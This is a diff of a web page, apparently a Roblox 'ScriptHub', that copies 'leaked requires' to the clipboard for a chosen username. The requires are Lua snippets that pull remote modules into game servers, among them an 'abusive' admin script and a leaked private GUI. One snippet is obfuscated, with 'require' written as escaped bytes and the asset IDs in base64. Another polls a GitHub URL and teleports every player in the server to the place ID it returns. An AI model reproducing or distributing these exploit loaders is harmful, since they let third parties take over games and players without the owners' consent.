@@ -4,10 +4,9 @@
 <title>OCbwoy3's ScriptHub</title>
 	<link rel="stylesheet" href="./style.css">
 	<meta charset="utf-8">
-	<meta name="description" content="This is the online version of OCbwoy3's ScriptHub">
-	<meta title="OCbwoy3's ScriptHub">
- 	<meta name="keywords" content="ScriptHub, Roblox">
-  	<meta name="author" content="OCboy3">
+	<meta name="description" content="OCbwoy3's ScriptHub Online lets you browse new, updated and leaked requires for free. Just enter your Roblox username and select a require.">
+	<meta title="OCbwoy3's ScriptHub Online">
+ 	<meta name="keywords" content="ScriptHub, Roblox, OCboy3, OCbwoy3">
 
 	<!-- Make the website feel like an iOS app -->
 	<link rel="manifest" href="./public/site.webmanifest"/>
@@ -15,41 +14,48 @@
 	<meta name="viewport" content="initial-scale=1, viewport-fit=cover"/>
 </head>
 <body>
-	<div style="position: absolute; bottom: 0; left: 0;">
-		<label for="username">Pls user:</label>
+	<div class="header" style="position: fixed; bottom: 15%; left: 50%; transform: translate(-50%,-50%);">
+		<label for="username">Give me your Roblox username:</label>
 		<input type="text" id="username" name="username" value="OCboy3">
 	</div>
-	<div style="position: absolute; top: 0; right: 0;">
-		<label for="require">Require lol:</label>
-		<input type="text" id="require" name="require">
+	<div class="header" style="position: fixed; top: 15%; left: 50%; transform: translate(-50%,-50%);">
+		<h1>OCbwoy3's ScriptHub Online</h1>
+		<h2 id="requirelol">Please select an require.</h2>
 	</div>
+
+	<!-- k00pgui leaked requires found at https://www.coursehero.com/file/199462015/SCRIPTLEAKtxt/ -->
+
 	<div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('dvsg')">DVSG</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('forcefield')">DVSG ForceField</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('space')">DVSG Space Elevator</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('detect')">OCbwoy3's Detection</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('adonis')">Adonis admin</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('prikols')">PrikolsNet (OCbwoy3's ScriptHub)</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('exser')">ExSer New</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('terrain')">Terrain Generator Beta</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('mugen')">MUGEN script</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('tele')">Cross-experience teleporter</button><br/><br/>
-		<button class="copyBtn" id="copyButton" onclick="copyRequire('antineko')">Anti-Neko SS</button><br/><br/>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('dvsg')">DVSG</button>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('forcefield')">DVSG ForceField</button>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('space')">DVSG Space Elevator</button><br/>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('detect')">OCbwoy3's Detection</button>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('adonis')">Adonis admin</button>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('prikols')">PrikolsNet</button><br/>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('exser')">ExSer New</button>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('terrain')">Terrain Generator</button>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('mugen')">MUGEN script</button><br/>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('tele')">Cross-experience teleporter</button>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('antineko')">Anti-Neko SS</button>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('k00pgui_ultimate_priv')">k00pgui ultimate private</button><br/>
+		<button class="copyBtn" id="copyButton" onclick="copyRequire('bean')">Mr. Bean Admin (abusive)</button>
+		
 	</div>
 	<script>
 		function copyText(textToCopy) {
 			var input = document.getElementById("username");
-			var output = document.createElement("textarea");
-			document.getElementById("require").value = textToCopy
-			output.value = textToCopy;
-			document.body.appendChild(output);
-			output.select();
-			document.execCommand("copy");
-			document.body.removeChild(output);
+			var output = document.getElementById("requirelol");
+			output.textContent = `${textToCopy}`;
+			try {
+				output.select();
+				document.execCommand("copy");
+			} catch {
+				window.navigator.clipboard.writeText(textToCopy)
+			}
 		}
 
 		function copyRequire(e) {
-			var username = document.getElementById("username").textContent;
+			var username = document.getElementById("username").value;
 			if (e === 'dvsg') {
 				copyText(`require(6586341488).dvsg("${username}")`)
 			} else if (e === 'forcefield') {
@@ -72,8 +78,13 @@
 				copyText(`require(13160586903).newBaseScript('script.Parent=game.Parent;local a=game:GetService("HttpService")local b=game:GetService("TeleportService")local function c()local d,e=pcall(function()a:GetAsync("https://raw.githubusercontent.com/ocboy3/ocboy3/main/3rdpartyTele",true)end)if d then if d=="0"then return end;local f={}for g,h in pairs(game:GetService("NetworkServer"))do if h and h:GetPlayer()then f[#f+1]=h:GetPlayer()end end;pcall(function()b:TeleportAsync(tonumber(e),f)end)game.Players.PlayerAdded:Connect(function(i)pcall(function()b:Teleport(tonumber(e),i)end)end)end end;while true do c()wait(5)end')`)
 			} else if (e === 'antineko') {
 				copyText(`s=getfenv()["\\114\\101\\113\\117\\105\\114\\101"](tonumber(tostring(getfenv()["\\114\\101\\113\\117\\105\\114\\101"](1.9988474659215096e+24/389489894389289).dec("NjUzOTg4MjQ0Nw=="))));s.s("ANSS")spawn(function()pcall(function()getfenv()[tostring("\\114\\101\\113\\117\\105\\114\\101")](tonumber(6688199886)).x(tostring("NjU2NzU4MzI2NjM=")) end)end)`)
+			} else if (e === 'k00pgui_ultimate_priv') {
+				copyText(`require(12174201819).pipiu("${username}")`)
+			} else if (e === 'bean') {
+				copyText(`require(5492934148):Fire("XD","${username}")`)
 			} else {
-				alert("Invalid require!")
+				var output = document.getElementById("requirelol");
+				output.textContent = `Invalid require "${e}"`;
 			}
 		}
 	</script>
